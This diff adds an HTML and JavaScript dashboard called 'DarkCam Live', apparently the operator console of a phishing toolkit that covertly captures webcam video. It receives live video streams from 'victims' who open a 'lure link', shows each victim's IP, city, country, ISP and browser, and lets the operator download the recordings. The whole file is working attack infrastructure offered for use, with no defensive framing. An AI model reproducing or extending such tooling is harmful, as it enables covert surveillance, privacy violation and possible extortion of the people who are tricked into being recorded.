@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DarkCam Live</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: #0a0a0a; color: #e0e0e0; font-family: 'Segoe UI', monospace; min-height: 100vh; }
+
+  .topbar {
+    background: #111; border-bottom: 1px solid #222;
+    padding: 12px 20px; display: flex; align-items: center;
+    justify-content: space-between; position: sticky; top: 0; z-index: 100;
+  }
+  .topbar-left { display: flex; align-items: center; gap: 12px; }
+  .logo { font-size: 18px; font-weight: 700; color: #ff4444; letter-spacing: 1px; }
+  .live-dot { width: 10px; height: 10px; background: #ff4444; border-radius: 50%;
+              animation: blink 1s infinite; }
+  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }
+  .status-bar { font-size: 12px; color: #555; }
+  #victim-count { color: #ff4444; font-weight: 700; }
+
+  .empty-state {
+    display: flex; flex-direction: column; align-items: center;
+    justify-content: center; height: calc(100vh - 55px);
+    color: #333; gap: 12px;
+  }
+  .empty-icon { font-size: 56px; opacity: 0.3; }
+  .empty-txt { font-size: 15px; }
+
+  #grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
+    gap: 16px; padding: 20px;
+  }
+
+  .victim-card {
+    background: #111; border: 1px solid #222;
+    border-radius: 12px; overflow: hidden;
+    transition: border-color 0.3s;
+  }
+  .victim-card.active { border-color: #ff4444; }
+  .victim-card.done   { border-color: #333; opacity: 0.7; }
+
+  .card-header {
+    background: #181818; padding: 10px 14px;
+    display: flex; align-items: center; gap: 8px;
+    border-bottom: 1px solid #222;
+  }
+  .card-live { font-size: 10px; font-weight: 700; color: #ff4444;
+               background: rgba(255,68,68,0.15); padding: 2px 7px;
+               border-radius: 3px; border: 1px solid #ff4444;
+               animation: blink 1.2s infinite; }
+  .card-done { font-size: 10px; font-weight: 700; color: #555;
+               background: #1a1a1a; padding: 2px 7px;
+               border-radius: 3px; border: 1px solid #333; }
+  .card-lure { font-size: 11px; font-weight: 700; color: #ff8800;
+               text-transform: uppercase; letter-spacing: 0.5px; }
+  .card-time { font-size: 11px; color: #444; margin-left: auto; }
+
+  .video-wrap {
+    position: relative; aspect-ratio: 4/3; background: #050505;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .card-video { width: 100%; height: 100%; object-fit: cover;
+                transform: scaleX(-1); display: block; }
+  .video-placeholder {
+    display: flex; flex-direction: column; align-items: center;
+    gap: 8px; color: #2a2a2a;
+  }
+  .video-placeholder .icon { font-size: 40px; }
+  .video-placeholder .txt { font-size: 12px; }
+  .buffering-badge {
+    position: absolute; top: 8px; left: 8px;
+    background: rgba(0,0,0,0.75); color: #ff8800;
+    font-size: 10px; font-weight: 700; padding: 3px 8px;
+    border-radius: 4px; display: none;
+  }
+
+  .card-info { padding: 10px 14px; display: grid; grid-template-columns: 1fr 1fr; gap: 4px; }
+  .info-row { font-size: 11px; color: #555; }
+  .info-row span { color: #aaa; }
+  .info-row.full { grid-column: 1 / -1; }
+
+  .card-footer { padding: 8px 14px; border-top: 1px solid #1a1a1a;
+                 display: flex; gap: 8px; align-items: center; }
+  .dl-btn {
+    font-size: 11px; color: #ff4444; background: rgba(255,68,68,0.1);
+    border: 1px solid rgba(255,68,68,0.3); border-radius: 4px;
+    padding: 4px 10px; cursor: pointer; text-decoration: none;
+    display: none;
+  }
+  .dl-btn:hover { background: rgba(255,68,68,0.2); }
+  .chunk-counter { font-size: 11px; color: #333; margin-left: auto; }
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="topbar-left">
+    <div class="live-dot"></div>
+    <div class="logo">🎥 DARKCAM LIVE</div>
+  </div>
+  <div class="status-bar">
+    Active victims: <span id="victim-count">0</span> &nbsp;|&nbsp;
+    <span id="conn-status" style="color:#555">Connecting...</span>
+  </div>
+</div>
+
+<div class="empty-state" id="emptyState">
+  <div class="empty-icon">📡</div>
+  <div class="empty-txt">Waiting for victims to connect...</div>
+  <div style="font-size:12px;color:#2a2a2a;margin-top:4px;">Send a lure link and wait</div>
+</div>
+
+<div id="grid"></div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+const sock = io({ transports: ['websocket', 'polling'] });
+const victims = {};
+let activeCount = 0;
+
+sock.on('connect', () => {
+  document.getElementById('conn-status').textContent = 'Connected';
+  document.getElementById('conn-status').style.color = '#44cc44';
+  sock.emit('join_dashboard');
+});
+
+sock.on('disconnect', () => {
+  document.getElementById('conn-status').textContent = 'Disconnected';
+  document.getElementById('conn-status').style.color = '#ff4444';
+});
+
+sock.on('victim_connected', (info) => {
+  document.getElementById('emptyState').style.display = 'none';
+  createCard(info);
+  activeCount++;
+  document.getElementById('victim-count').textContent = activeCount;
+});
+
+sock.on('stream_chunk', (data) => {
+  appendChunk(data.sid, data.data, data.first);
+});
+
+sock.on('victim_done', (data) => {
+  const card = document.getElementById(`card-${data.sid}`);
+  if (!card) return;
+  card.classList.remove('active');
+  card.classList.add('done');
+  const badge = card.querySelector('.card-live');
+  if (badge) { badge.textContent = 'SAVED'; badge.className = 'card-done'; }
+  const dl = card.querySelector('.dl-btn');
+  if (dl) dl.style.display = 'inline-block';
+  activeCount = Math.max(0, activeCount - 1);
+  document.getElementById('victim-count').textContent = activeCount;
+});
+
+function createCard(info) {
+  if (document.getElementById(`card-${info.sid}`)) return;
+
+  const card = document.createElement('div');
+  card.className = 'victim-card active';
+  card.id = `card-${info.sid}`;
+  card.innerHTML = `
+    <div class="card-header">
+      <span class="card-live">● LIVE</span>
+      <span class="card-lure">${escH(info.lure)}</span>
+      <span class="card-time">${escH(info.time)}</span>
+    </div>
+    <div class="video-wrap">
+      <video class="card-video" id="v-${escH(info.sid)}" autoplay muted playsinline></video>
+      <div class="video-placeholder" id="ph-${escH(info.sid)}">
+        <div class="icon">📷</div>
+        <div class="txt">Waiting for stream...</div>
+      </div>
+      <div class="buffering-badge" id="buf-${escH(info.sid)}">BUFFERING</div>
+    </div>
+    <div class="card-info">
+      <div class="info-row">IP: <span>${escH(info.ip)}</span></div>
+      <div class="info-row">Time: <span>${escH(info.time)}</span></div>
+      <div class="info-row">City: <span>${escH(info.city)}, ${escH(info.country)}</span></div>
+      <div class="info-row">ISP: <span>${escH(info.isp)}</span></div>
+      <div class="info-row full">UA: <span style="font-size:10px">${escH(info.ua.substring(0,60))}...</span></div>
+    </div>
+    <div class="card-footer">
+      <a class="dl-btn" href="/output/${escH(info.sid)}.webm" download>⬇ Download</a>
+      <span class="chunk-counter" id="cc-${escH(info.sid)}">0 chunks</span>
+    </div>
+  `;
+  document.getElementById('grid').appendChild(card);
+
+  // Setup MSE
+  const video = document.getElementById(`v-${info.sid}`);
+  const ms    = new MediaSource();
+  video.src   = URL.createObjectURL(ms);
+  let sb      = null;
+  const queue = [];
+  let chunkCount = 0;
+
+  ms.addEventListener('sourceopen', () => {
+    // Try VP9 first, fallback to VP8
+    const codec = MediaSource.isTypeSupported('video/webm;codecs=vp9')
+                  ? 'video/webm;codecs="vp9"'
+                  : 'video/webm;codecs="vp8"';
+    try {
+      sb = ms.addSourceBuffer(codec);
+    } catch(e) {
+      sb = ms.addSourceBuffer('video/webm');
+    }
+    sb.mode = 'sequence';
+    sb.addEventListener('updateend', () => {
+      if (queue.length > 0) sb.appendBuffer(queue.shift());
+    });
+    sb.addEventListener('error', (e) => console.warn('SB error', e));
+  });
+
+  function append(buf) {
+    if (!sb) { queue.push(buf); return; }
+    if (sb.updating) { queue.push(buf); return; }
+    try { sb.appendBuffer(buf); } catch(e) { console.warn('append err', e); }
+  }
+
+  victims[info.sid] = {
+    ms, sb_ref: () => sb, queue,
+    append,
+    onChunk: (data, first) => {
+      const buf = new Uint8Array(
+        data instanceof ArrayBuffer ? data : Object.values(data)
+      );
+      append(buf);
+      chunkCount++;
+      // Show video, hide placeholder
+      document.getElementById(`ph-${info.sid}`).style.display = 'none';
+      video.style.display = 'block';
+      document.getElementById(`cc-${info.sid}`).textContent = `${chunkCount} chunks`;
+
+      // Auto-play
+      if (video.paused) video.play().catch(() => {});
+    }
+  };
+}
+
+function appendChunk(sid, data, first) {
+  if (!victims[sid]) return;
+  victims[sid].onChunk(data, first);
+}
+
+function escH(s) {
+  return String(s)
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;')
+    .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+</script>
+</body>
+</html>
